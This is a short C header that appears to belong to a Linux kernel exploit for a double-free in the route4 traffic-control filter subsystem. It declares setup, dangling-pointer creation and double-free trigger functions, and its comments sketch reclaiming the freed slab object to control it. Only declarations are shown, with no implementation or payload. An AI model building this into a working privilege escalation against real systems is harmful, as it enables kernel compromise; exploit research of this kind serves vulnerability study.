#ifndef ROUTE4_DF
#define ROUTE4_DF

/* 
 * This sets up all the kernel route4 subsystem
 * adding qdisc and preparing it to receive tc_filters
 */
void init_route4(void);

/* 
 * This allocates a tc_filter on the kmalloc cache
 * then it frees it creating a dangling pointer in
 * route4 subsystem. The caller should perform a subsequent
 * allocation on the same cache to retain the control of
 * the dangling pointer
 */
void create_dangling_ptr(void);

/*
 * This function frees again the previously created
 * dangling pointer in route4 subsystem
 */
void trigger_df(void);

#endif /* ROUTE4_DF */
